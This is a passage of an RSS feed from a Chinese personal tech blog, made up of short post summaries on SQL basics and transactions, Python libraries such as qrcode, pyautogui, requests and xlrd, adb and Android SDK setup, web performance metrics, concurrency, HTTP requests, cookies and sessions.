 Atomic，原子性，将所有SQL作为原子工作单元执行，要么全部执行，要么全部不执行 Consistent，一致性，事务完成后，所有数据的状态都是一致的，即A账户只要减去了100，B账户则必定加上了100 Isolation，隔离性，如果有多个事务并发执行，每个事务作出的修改必须与其他事务隔离 Duration，持久性，即事务完成后，对数据库数据的修改被持久化存储  2.隐式事务 对于单条SQL语句，数据库系统自动将其作为一个事务执行。
3.显式事务 要手动把多条SQL语句作为一个事务执行，使用BEGIN开启一个事务，使用COMMIT提交一个事务，例如，把上述的转账操作作为一个显式事务：
BEGIN; UPDATE accounts SET balance = balance - 100 WHERE id = 1; UPDATE accounts SET balance = balance + 100 WHERE id = 2; COMMIT; 很显然多条SQL语句要想作为一个事务执行，就必须使用显式事务。COMMIT是指提交事务，即试图把事务内的所有SQL所做的修改永久保存。如果COMMIT语句执行失败了，整个事务也会失败。</description>
    </item>
    
    <item>
      <title>Python(6)——Qrcode</title>
      <link>https://ac-lm.github.io/posts/python/python6qrcode/</link>
      <pubDate>Tue, 29 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python6qrcode/</guid>
      <description>1.什么是二维码 二维码其实可以看成是一种数据的加密，在这里面的数据，可以通过某种编码，转化成黑白不同的点，然后按顺序排列其中。当我们去识别二维码的时候，其实就是把这些数据转化回来。
根据二维码其不同的编码类型，版本，以及纠错级别，二维码的复杂程度会有所变化。其中版本分 1-40 个级别，版本越高，能存储的数据就越多，用公式来表示就是这样：v X 4+17 。而纠错级别又分为 L、M、Q、H，有时候你可能看到有些二维码整的花里胡哨，或者有的地方缺失了还是能被识别，这可能是这张二维码的容错级别比较高。而级别越低，纠错能力越低，但是能存储更多的数据。而这些格式信息，都可以在三个大方块的边沿定义，三个大方块作为定位的标志，然后剩下的区域就是来放数据码和纠错码。
Qrcode 就是 Python 中二维码的处理库
2.安装 pip install qrcode 3.使用 import qrcode qr = qrcode.QRCode( version=3, error_correction=qrcode.constants.ERROR_CORRECT_Q, box_size=10, border=4, ) qr.add_data(&amp;#39;This is a qrcode&amp;#39;) qr.make(fit=True) img=qr.make_image(fill_color=&amp;#39;black&amp;#39;,back_color=&amp;#39;white&amp;#39;) img.show() </description>
    </item>
    
    <item>
      <title>SQL(3)——修改数据</title>
      <link>https://ac-lm.github.io/posts/sql/sql3%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Tue, 29 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/sql/sql3%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/</guid>
      <description>参考原文：SQL教程 @廖雪峰 
 关系数据库的基本操作就是增删改查，即CRUD：Create、Retrieve、Update、Delete。其中，对于查询，我们已经详细讲述了SELECT语句的详细用法。
而对于增、删、改，对应的SQL语句分别是：
 INSERT：插入新记录 UPDATE：更新已有记录 DELETE：删除已有记录  1.INSERT插入 INSERT语句的基本语法是：
INSERT INTO &amp;lt;表名&amp;gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...); INSERT INTO students (class_id, name, gender, score) VALUES (2, &amp;#39;大牛&amp;#39;, &amp;#39;M&amp;#39;, 80); 注意到我们并没有列出id字段，也没有列出id字段对应的值，这是因为id字段是一个自增主键，它的值可以由数据库自己推算出来。此外，如果一个字段有默认值，那么在INSERT语句中也可以不出现。
要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写INSERT INTO students (score, gender, name, class_id) &amp;hellip;，但是对应的VALUES就得变成(80, &amp;lsquo;M&amp;rsquo;, &amp;lsquo;大牛&amp;rsquo;, 2)。
还可以一次性添加多条记录，只需要在VALUES子句中指定多个记录值，每个记录是由(&amp;hellip;)包含的一组值：
INSERT INTO students (class_id, name, gender, score) VALUES (1, &amp;#39;大宝&amp;#39;, &amp;#39;M&amp;#39;, 87), (2, &amp;#39;二宝&amp;#39;, &amp;#39;M&amp;#39;, 81); 2.UPDATE更新 UPDATE语句的基本语法是：
UPDATE &amp;lt;表名&amp;gt; SET 字段1=值1, 字段2=值2, .</description>
    </item>
    
    <item>
      <title>SQL(2)——查询数据</title>
      <link>https://ac-lm.github.io/posts/sql/sql2%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Mon, 28 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/sql/sql2%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</guid>
      <description>参考原文：SQL教程 @廖雪峰 
 1.基本查询 要查询数据库表的数据，我们使用如下的SQL语句：
SELECT * FROM &amp;lt;表名&amp;gt;; 使用SELECT * FROM students时，SELECT是关键字，表示将要执行一个查询，*表示“所有列”，FROM表示将要从哪个表查询，该SQL将查询出students表的所有数据。注意：查询结果也是一个二维表，它包含列名和每一行的数据。
SELECT语句其实并不要求一定要有FROM子句：
SELECT 100+200; 上述查询会直接计算出表达式的结果。虽然SELECT可以用作计算，但它并不是SQL的强项。此外，不带FROM子句的SELECT语句有一个有用的用途，就是用来判断当前到数据库的连接是否有效。许多检测工具会执行一条SELECT 1;来测试数据库连接。
2.条件查询 SELECT语句可以通过WHERE条件来设定查询条件，查询结果是满足查询条件的记录。例如，要指定条件“分数在80分或以上的学生”，写成WHERE条件就是：
SELECT * FROM students WHERE score &amp;gt;= 80; SELECT * FROM students WHERE score BETWEEN 60 AND 90 条件表达式可以用&amp;lt;条件1&amp;gt; AND &amp;lt;条件2&amp;gt;表达满足条件1并且满足条件2。例如，符合条件“分数在80分或以上”，并且还符合条件“男生”，把这两个条件写出来：
SELECT * FROM students WHERE score &amp;gt;= 80 AND gender = &amp;#39;M&amp;#39;; 第二种条件是&amp;lt;条件1&amp;gt; OR &amp;lt;条件2&amp;gt;，表示满足条件1或者满足条件2。例如，把上述AND查询的两个条件改为OR，查询结果就是“分数在80分或以上”或者“男生”，满足任意之一的条件即选出该记录：
SELECT * FROM students WHERE score &amp;gt;= 80 OR gender = &amp;#39;M&amp;#39;; 第三种条件是NOT &amp;lt;条件&amp;gt;，表示“不符合该条件”的记录。例如，写一个“不是2班的学生”这个条件:</description>
    </item>
    
    <item>
      <title>SQL(1)——数据库语言</title>
      <link>https://ac-lm.github.io/posts/sql/sql1%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E8%A8%80/</link>
      <pubDate>Sun, 27 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/sql/sql1%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E8%A8%80/</guid>
      <description>参考原文：SQL教程 @廖雪峰 
 1.什么是SQL(Structured Query Language) SQL是结构化查询语言的缩写，用来访问和操作数据库系统。SQL语句既可以查询数据库中的数据，也可以添加、更新和删除数据库中的数据，还可以对数据库进行管理和维护操作。不同的数据库，都支持SQL，这样，我们通过学习SQL这一种语言，就可以操作各种不同的数据库。
虽然SQL已经被ANSI组织定义为标准，不幸地是，各个不同的数据库对标准的SQL支持不太一致。并且，大部分数据库都在标准的SQL上做了扩展。也就是说，如果只使用标准SQL，理论上所有数据库都可以支持，但如果使用某个特定数据库的扩展SQL，换一个数据库就不能执行了。例如，Oracle把自己扩展的SQL称为PL/SQL，Microsoft把自己扩展的SQL称为T-SQL。
现实情况是，如果我们只使用标准SQL的核心功能，那么所有数据库通常都可以执行。不常用的SQL功能，不同的数据库支持的程度都不一样。而各个数据库支持的各自扩展的功能，通常我们把它们称之为“方言”。
总的来说，SQL语言定义了这么几种操作数据库的能力：
 DDL(Data Definition Language)：DDL允许用户定义数据，也就是创建表、删除表、修改表结构这些操作。 DML(Data Manipulation Language)：DML为用户提供添加、删除、更新数据的能力. DQL(Data Query Language):DQL允许用户查询数据，这也是通常最频繁的数据库日常操作。  PS: SQL语言关键字不区分大小写！但是，针对不同的数据库，对于表名和列名，有的数据库区分大小写，有的数据库不区分大小写
2.为什么需要数据库 因为应用程序需要保存用户的数据，比如Word需要把用户文档保存起来，以便下次继续编辑或者拷贝到另一台电脑。要保存用户的数据，一个最简单的方法是把用户数据写入文件。例如，要保存一个班级所有学生的信息，可以向文件中写入一个CSV文件；如果要保存学校所有班级的信息，可以写入另一个CSV文件。
但是，随着应用程序的功能越来越复杂，数据量越来越大，如何管理这些数据就成了大问题
 读写文件并解析出数据需要大量重复代码； 从成千上万的数据中快速查询出指定数据需要复杂的逻辑。  如果每个应用程序都各自写自己的读写数据的代码，一方面效率低，容易出错，另一方面，每个应用程序访问数据的接口都不相同，数据难以复用。
所以，数据库作为一种专门管理数据的软件就出现了。应用程序不需要自己管理数据，而是通过数据库软件提供的接口来读写数据。至于数据本身如何存储到文件，那是数据库软件的事情，应用程序自己并不关心，这样一来，编写应用程序的时候，数据读写的功能就被大大地简化了。
3.数据库模型 数据库按照数据结构来组织、存储和管理数据，实际上，数据库一共有三种模型：
 层次模型 网状模型 关系模型  层次模型就是以“上下级”的层次关系来组织数据的一种方式，层次模型的数据结构看起来就像一颗树：
 ┌─────┐│ │└─────┘│┌───────┴───────┐│ │┌─────┐ ┌─────┐│ │ │ │└─────┘ └─────┘│ │┌───┴───┐ ┌───┴───┐│ │ │ │┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐│ │ │ │ │ │ │ │└─────┘ └─────┘ └─────┘ └─────┘网状模型把每个数据节点和其他很多节点都连接起来，它的数据结构看起来就像很多城市之间的路网：</description>
    </item>
    
    <item>
      <title>Python(5)——Pyautogui</title>
      <link>https://ac-lm.github.io/posts/python/python5pyautogui/</link>
      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python5pyautogui/</guid>
      <description>1.什么是 Pyautogui PyAutoGUI 是 Python 编写的一个实现自动化鼠标和键盘操作的库。
2.使用 import pyautogui screenWidth, screenHeight = pyautogui.size() # 返回屏幕分辨率 print(screenWidth,screenHeight) currentMouseX, currentMouseY = pyautogui.position() # 返回鼠标的所在位置 print(currentMouseX,currentMouseY) #pyautogui.moveTo(327, 382) #移动鼠标到指定位置 #pyautogui.click() # 单击 #pyautogui.doubleClick() # 双击鼠标 </description>
    </item>
    
    <item>
      <title>随记(12)——MD5加密与耦合</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B012md5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%80%A6%E5%90%88/</link>
      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B012md5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%80%A6%E5%90%88/</guid>
      <description>1.MD5加密 百科 MD5信息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。MD5由美国密码学家罗纳德·李维斯特（Ronald Linn Rivest）设计，于1992年公开，用以取代MD4算法。这套算法的程序在 RFC 1321 标准中被加以规范。1996年后该算法被证实存在弱点，可以被加以破解，对于需要高度安全性的数据，专家一般建议改用其他算法，如SHA-2。2004年，证实MD5算法无法防止碰撞（collision），因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途。
特点  不可逆，几乎不能还原出原始数据 完全相同的一段数据，不论时间地点（加密算法相同的条件）加密出的32位的字符串完全相同 解密方法只有【碰撞】(撞库，穷举足够的数据，几乎难以实现解密) 【散列】(Hash，哈希，把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值）能力强，数据即使只有百分之零点几的的差别也会导致MD5完全不一样，只要两个数据的MD5相同，那我们可以认为这两个数据完全相同  2.耦合 百科 耦合（Coupling）表示两个子系统（或类）之间的关联程度，当一个子系统（或类）发生变化时对另一个子系统（或类）的影响很小，则称它们是松散耦合的；反之，如果变化的影响很大时，则称它们是紧密耦合的。耦合的强弱取决于模块间接间的复杂性、引用模块的位置和数据的传送方式等。设计时应尽量使模块间的耦合度小，模块间的耦合度直接影响系统的可理解性、可测试性、可靠性和可维护性。
分类 耦合也可分为七级，从低至高为：非直接耦合（Nondirect coupling）、数据耦合（Data coupling）、标记耦合（Stamp coupling）、控制耦合（Control coupling）、外部耦合（External coupling）、公共耦合（Common coupling）、内容耦合（Content coupling）。耦合度应越低越好 。
 非直接耦合：两模块间彼此无任何交互 数据耦合：两模块间仅通过参数交换信息 标记耦合：如果模块间传送的参数包含着复合数据结构，例如含有若干数据项的数据记录 控制耦合：传递的参数中含有控制信息，如一个用于控制模块内部逻辑的标志信息 外部耦合：指若干模块与同一个外部环境进行关联，如I/O处理使所有I/O模块与特定的设备、格式和通信协议相关联 公共耦合：指模块间存在着全局变量、公共数据区或可共享的文件 内容耦合：指模块间存在着一个模块直接转入另一模块内部或一个模块直接使用另一模块的数据或控制信息的路径  </description>
    </item>
    
    <item>
      <title>Android(2)—Adb 调试</title>
      <link>https://ac-lm.github.io/posts/android/android2adb-%E8%B0%83%E8%AF%95/</link>
      <pubDate>Tue, 22 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/android/android2adb-%E8%B0%83%E8%AF%95/</guid>
      <description>1.Adb 的简单使用 Adb 是随 Android SDK 一同安装的工具，通常存放于 SDK\Android\platform-tools 内。
# 环境 Huawei TRT-AL00A adb devices # 设备 adb shell wm size # 长宽 adb shell getevent -p # 监听事件 adb shell # shell &amp;gt;&amp;gt;&amp;gt; HWTRT-Q:/ $ getevent /dev/input/event4 # 按键事件 &amp;gt;&amp;gt;&amp;gt; HWTRT-Q:/ $ exit adb shell getevent /dev/input/event4 # 按键事件 adb shell dumpsys # 获取当前运行的服务 adb shell dumpsys battery # 获取设备电池信息 adb shell dumpsys cpuinfo adb shell dumpsys meminfo # 要获取具体应用的内存信息，可加上包名 adb shell dumpsys meminfo PACKAGE_NAME # 获取某个包的信息： adb shell dumpsys package PACKAGE_NAME 2.</description>
    </item>
    
    <item>
      <title>Android(1)—不使用 Android Studio 配置 Android SDK</title>
      <link>https://ac-lm.github.io/posts/android/android1%E4%B8%8D%E4%BD%BF%E7%94%A8-android-studio-%E9%85%8D%E7%BD%AE-android-sdk/</link>
      <pubDate>Mon, 21 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/android/android1%E4%B8%8D%E4%BD%BF%E7%94%A8-android-studio-%E9%85%8D%E7%BD%AE-android-sdk/</guid>
      <description>1.环境 Windows，无 Android Studio
2.配置Android SDK 下载 Android CMD 工具 sdkmanager
并将 Android\cmdline-tools\latest\bin\sdkmanager.bat 添加到环境变量中
运行 sdkmanager
配置SDK sdkmanager &amp;quot;platform-tools&amp;quot; &amp;quot;platforms;android-28&amp;quot;
检查环境变量 ANDROID_SDK_ROOT 是否存在，指向 SDK 文件夹
3.sdkmanager # 若要卸载软件包，只需添加 `--uninstall` 标记 sdkmanager --uninstall packages [options] sdkmanager --uninstall --package_file=package_file [options] # 以下命令列出已安装和可用的软件包 sdkmanager --list [options] \ [--channel=channel_id] // Channels: 0 (stable), 1 (beta), 2 (dev), or 3 (canary) # 更多请查看参考文档  参考文档：sdkmanager @Android Studio用户指南 
 </description>
    </item>
    
    <item>
      <title>随记(11)——Web性能测试的指标</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B011web-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9A%84%E6%8C%87%E6%A0%87/</link>
      <pubDate>Sun, 20 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B011web-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9A%84%E6%8C%87%E6%A0%87/</guid>
      <description>1.事务 事务就是用户某一步或几步操作的集合，它具有一个完整意义。比如用户对某一个页面的一次请求，对某系统的一次登录，对商品的一次确认支付过程。这些我们都可以看作一个事务，需要理解的是事务不等于请求。
2.请求(PV) PV 是 Page View 的缩写。用户通过浏览器访问页面，对应用服务器产生的一次请求，记为一个 PV。将这个概念做了延伸，系统真实处理的一个请求，视为一个 PV。
3.TPS(Transaction Per second) 每秒钟系统能够处理事务的数量，它是衡量系统处理能力的重要指标。此外，一个系统的性能其实是由TPS决定，跟并发用户数没有多大关系。一般在同样的TPS下，可以用不同并发用户数去压测得到，只是得到响应时间不同。
4.QPS(Query Per Second) 每秒查询数。QPS 基本类似于 TPS，但是不同的是，对于一个页面的一次访问，形成一个TPS；但一次页面请求，可能产生多次对服务器的请求，服务器对这些请求，会被计入QPS之中。
 例如：访问一个页面会请求服务器3次，产生一个“T”，产生3个“Q”。 PS： QPS(TPS) = 并发数 / 平均响应时间  5.HPS(Hit Per Second ) / RPS(Request Per Second) 点击率 / 每秒HTTP请求数。
6.响应时间(RT) 网页响应请求的时间，测试时可参考2/5/8原则，即2秒之内用户觉得很快，5秒之内用户觉得还可以，8秒之外用户觉得系统慢，无法忍受。
7.吞吐量 吞吐量指在一次性能测试过程中网络上传输的数据量的总和。对于交互式应用来说，吞吐量指标反映的是服务器承受的压力，在容量规划的测试中，吞吐量是一个重点关注的指标，因为它能够说明系统级别的负载能力，另外，在性能调优过程中，吞吐量指标也有重要的价值。吞吐量是整个系统的瓶颈。
但是，用吞吐量来衡量一个系统的输出能力是极其不准确的，我们要加单位时间的限制，这就引出了一个新的概念——吞吐率（单位时间内网络上传输的数据量，也可以指单位时间内处理客户请求数量，通常情况下，吞吐率用“字节数/秒”来衡量）
a.吞吐量指标的作用  用于协助设计性能测试场景，以及衡量性能测试场景是否达到了预期的设计目标。 用于协助分析性能瓶颈：吞吐量的限制是性能瓶颈的一种重要表现形式，因此，有针对性地对吞吐量设计测试，可以协助尽快定位到性能瓶颈的所在位置。 一般情况下 TPS 与 吞吐量说的是同一个东西  b.快速识别系统性能瓶颈的方法——RBI（rapid bottleneck identify）  80%的系统，其性能瓶颈都由吞吐量制约 并发用户数和吞吐量瓶颈之间存在一定的关联 采用吞吐量测试可以更快速定位问题 通过不断增加并发用户数和吞吐量观察系统的性能瓶颈。然后，从网络、数据库、应用服务器和代码本身4个环节确定系统的的性能瓶颈。  c.容量预测 对于我们设计的系统，我们在上线前肯定需要测试下能接收用户多大的访问量。即希望评估出最大的日PV到来的时候，我们的系统是否能支撑。但怎么去评估呢，难道要造一个最大日PV的情景来测试？其实根据已有的经验和数据，可以总结出了高峰QPS和日PV的关系。通过数学建模，我们发现高峰每台服务器【QPS = (( 总PV X 80% ) / ( 24 X 60 X 60 X 40%)) / 服务器数量】。其中80%和40%这2个数字是个不固定的参数，这个公式代表的意思是，在40%的时间（12小时）内产生80%总PV的QPS均值。对于不同的情景有不同的参数。</description>
    </item>
    
    <item>
      <title>随记(10)——并发和并行</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B010%E5%B9%B6%E5%8F%91%E5%92%8C%E5%B9%B6%E8%A1%8C/</link>
      <pubDate>Sat, 19 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B010%E5%B9%B6%E5%8F%91%E5%92%8C%E5%B9%B6%E8%A1%8C/</guid>
      <description>1.什么是并发 并发（Concurrent），在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行。并发是会抢占资源的。
2.什么是并行 并行（Parallel），当系统有一个以上CPU时，可以让一个CPU执行一个进程，另一个CPU执行另一个进程，两个进程互不抢占CPU资源，可以同时进行，这种方式称之为并行，决定并行的因素不是CPU的数量，而是CPU的核心数量，比如一个CPU多个核也可以并行。并行是不会抢占资源的。
3.并行和并发的区别  并发，指的是多个事情，在同一时间段内同时发生了 并行，指的是多个事情，在同一时间点上同时发生了 并发的多个任务之间是互相抢占资源的 并行的多个任务之间是不互相抢占资源的 并发是一个处理器多条等待队列 并行是多个处理器多条等待队列  4.并发的两种情况  一种是严格意义上的并发，即所有的用户在同一时间点做同一件事或操作，这种操作一般指做同一类型的业务。比如，所有用户同一时刻做并发登陆，同一时刻做表单提交。 另外一种并发是广义范围的并发，这种并发与前一种并发的区别是，尽管多个用户对系统发出了请求或者进行了操作，但是这些请求或都操作可以是相同的，也可以是不同的。比如，在同一时刻有用户在登录，有用户在提交表单  5.并发编程的性能消耗？  在使用多线程时，线程的上下文切换会消耗性能，消耗时间 其次是资源限制问题。由于程序的执行速度受限于计算机硬件资源或软件资源。例如，服务器的带宽只有 2Mb/s，某个资源的下载速度是 1Mb/s 每秒，即使系统启动 10 个线程下载资源，下载速度不会变成 10Mb/s，所以在进行并发编程时，要考虑这些资源的限制。硬件资源限制有带宽的上传/下载速度、硬盘读写速度和CPU的处理速度。软件资源限制有数据库的连接数和socket连接数等。 对于硬件资源限制，可以考虑使用集群并行执行程序。既然单机的资源有限制，那么就让程序在多机上运行，搭建服务器集群，使用不同的机器处理不同的数据。 对于软件资源限制，可以考虑使用资源池将资源复用。比如使用连接池将数据库和Socket连接复用，或者在调用对方 webservice 接口获取数据时，只建立一个连接。  6.并发编程的优势 在实现网络资源的断点续传时，通过将资源进行切分为不同大小的任务，启动多线程下载。这样即使在网络阻塞时，下载速度的减速效果也没这么明显。这便是多线程的优势，即使一个线程由于网络阻塞被卡住，但可能会有另一个线程正处在慢启动的最终加速阶段，这样总体的下载速度就明显优于单线程。</description>
    </item>
    
    <item>
      <title>Python(4)——Requests</title>
      <link>https://ac-lm.github.io/posts/python/python4requests/</link>
      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python4requests/</guid>
      <description>1.什么是 Requests Requests 是一个基于 urllib 编写的HTTP库，相比 urllib 库，Requests 库更加方便，能轻易的实现各种 HTTP 测试需求。Requests 库经常被用来进行接口测试以及爬虫
2.request()函数的参数 | 参数 | 解释 | --------------- | ------------------------------------------------------------ | method | 请求方法，比如get、options、head、post、put、patch、delete| url | 请求的url | params | 请求携带的params | data | 请求body中的data | json | 请求body中的json格式的data | headers | 请求携带的headers | cookies | 请求携带的cookies | files | 上传文件时使用 | auth | 身份认证时使用 | timeout | 设置请求的超时时间，可以设置连接超时和读取超时 | allow_redirects | 是否允许重定向，默认True，即允许重定向 | proxies | 设置请求的代理，支持http代理以及socks代理（需要安装第三方库&amp;quot;pip install requests[socks]&amp;quot;） | verify | 用于https请求时的ssl证书验证，默认是开启的，如果不需要则设置为False即可 | stream | 是否立即下载响应内容，默认是False，即立即下载响应内容 | cert | 用于指定本地文件用作客户端证书 3.</description>
    </item>
    
    <item>
      <title>随记(9)——响应时间的组成</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B09%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E7%9A%84%E7%BB%84%E6%88%90/</link>
      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B09%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E7%9A%84%E7%BB%84%E6%88%90/</guid>
      <description>响应时间RT把整个过程分三个部分：呈现时间，数据传输时间和系统处理时间。
1.呈现时间 主要说的是浏览器对接收到数据的一个处理展示的过程。我们会发现同一台电脑同一个网站，通过Chrome去访问，页面的呈现速度会比IE略快，呈现时间不仅与浏览器有关，还和承载它的操作系统有关，以及电脑硬件（比如CPU、 内存）
2.数据传输时间 我们发送一个请求需要时间，系统处理完后返回给我们也需要时间。
互联网是个网，就是有着相同的起点与终点，信息也有可能走的不同的路线。即使你发出的请求都能成功发出，但到目的地的时候，已经不能叫并发了。这也是为什么我们在一般做性能测试时，一般要强调要在局域网中进行。当然，有些性能测试需要在互联网中时行。但它们重点不是验证服务器端的最大处理能力。
3.系统处理时间 当系统得到请求后会对请求进行处理并将结果返回。我们进行性能测试的目的主要就是验证系统的处理时间
4.测试方法 因为前面的呈现时间和数据传输时间都是我们不可控制的，用户使用的电脑及浏览器千差万别，用户的网络状况千差万别。我们唯一能控制的就是将系统的处理请求的时间缩到最短。
一般测试工具都应该屏蔽响应的呈现过程，只是模拟多用户并发请求，计算用户得到响应的时间，不会将服务器的每个响应做客户端渲染呈现。
对于数据传输的问题，这也是我要强调的性能测试要在局域网中进行，在局域网中一般不会受到数据带宽的限制。所以，可以对数据的传输时间忽略不计。</description>
    </item>
    
    <item>
      <title>随记(8)——Web请求</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B08web-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B08web-%E8%AF%B7%E6%B1%82/</guid>
      <description>1.POST和GET的区别  发送时都包含请求头请求参数，POST多了请求body GET多用来查询，请求参数放在URL中，不会对服务器上的内容产生作用。POST用来提交，数据放入body中 GET是直接添加到URL后面的，直接就可以在URL中看到内容，而POST是放在报文内部的，用户无法直接看到 GET提交的数据长度是有限制的，因为URL长度有限制，具体的长度限制视浏览器而定。而POST没有  2.响应状态码 访问一个网页时，浏览器会向web服务器发出请求。此网页所在的服务器会返回一个包含HTTP状态码的信息头用以响应浏览器的请求。常见的状态码分类
 1XX- 信息型，服务器收到请求，需要请求者继续操作。 2XX- 成功型，请求成功收到，理解并处理。 3XX - 重定向，需要进一步的操作以完成请求。 4XX - 客户端错误，请求包含语法错误或无法完成请求。 5XX - 服务器错误，服务器在处理请求的过程中发生了错误。  3.常见状态码  200 - 客户端请求成功 301 - 资源（网页等）被永久转移到其它URL 302 - 临时跳转 400 - 客户端请求有语法错误，不能被服务器所理解 401 - 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 404 - 请求资源不存在，可能是输入了错误的URL 500 - 服务器内部发生了不可预期的错误 503 - 服务器当前不能处理客户端的请求，一段时间后可能恢复正常  4.什么是Token Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。推荐用设备号/设备mac地址作为Token或者使用session值作为Token
5.Cookie与Session 首先我们需要知道HTTP协议的一个重要特点——“无状态”，数据交换完成，服务端和客户端就断开连接了，所以请求之间没有相关联系，每一个请求都是一个独立的新请求，为了实现状态保留的，保证前后正常通信，需要在客户端或服务器端存储与会话相关的数据,所以设计了这两个机制——Cookie与Session
Cookie是由W3C组织提出的保存在客户端本地，方便下次访问服务端时直接放到请求报文头中，如登录的cookie，下次访问同一网站时，用户不必再次输入用户名和密码就已经直接登录.
Session是保存在服务器上用来记录用户状态的机制。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。Session在用户第一次访问服务器的时候自动创建。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。一般客户端和服务端通过一个SessionID来进行沟通，为了防止不同的用户之间出现冲突和重复，SessionID一般是一个32或者48个字节的随机字符串
6.Cookie与Session的区别  存放位置不同：cookie数据存放在客户端（浏览器）；session数据放在服务器端，一般存储在内存中，但是SessionID存储在客户端cookie中。 cookie由浏览器存储在本地，安全有风险，不宜存储敏感信息，如密码等。 session会在一定时间内保存在服务器上，访问较多时，影响服务器性能。  </description>
    </item>
    
    <item>
      <title>Python(3)——xlrd</title>
      <link>https://ac-lm.github.io/posts/python/python3xlrd/</link>
      <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python3xlrd/</guid>
      <description>1.什么是xlrd库 python 中操作 Excel 表格主要用到 xlrd 和 xlwt 这两个库，xlrd 库提供读取功能，xlwt 库提供写入功能，但 python 中不存在对 Excel 表格进行修改的库。（注意在版本1.3.0中，这两个库不再支持 xlsx 格式的表格文件，如要使用请指定版本1.2.0）
2.安装 pip install xlrd==1.2.0 3.使用 import xlrd data = xlrd.open_workbook(filename) #文件名以及路径 导入和打开文档后，必须先定位到 sheet，才能进行下一步操作，程序只有在获取对应的 sheet 之后，才能进行对行和列以及单元格的操作
a.获取工作表 table = data.sheets()[0] #通过索引顺序获取 table = data.sheet_by_index(sheet_indx) #通过索引顺序获取 table = data.sheet_by_name(sheet_name) #通过名称获取 names = data.sheet_names() #返回book中所有工作表的名字 data.sheet_loaded(sheet_name or indx) # 检查某个sheet是否导入完毕 b.对行的操作 nrows = table.nrows #获取该sheet中的有效行数 table.row(rowx) #返回由该行中所有的单元格对象组成的列表 table.row_slice(rowx) #返回由该列中所有的单元格对象组成的列表 table.row_types(rowx, start_colx=0, end_colx=None) #返回由该行中所有单元格的数据类型组成的列表 table.row_values(rowx, start_colx=0, end_colx=None) #返回由该行中所有单元格的数据组成的列表 table.</description>
    </item>
    
    <item>
      <title>Web服务器(4)——Nginx解决乱码</title>
      <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A84nginx-%E8%A7%A3%E5%86%B3%E4%B9%B1%E7%A0%81/</link>
      <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A84nginx-%E8%A7%A3%E5%86%B3%E4%B9%B1%E7%A0%81/</guid>
      <description>问题 当 Nginx 服务器运行时，有时用户访问中文内容会出现乱码
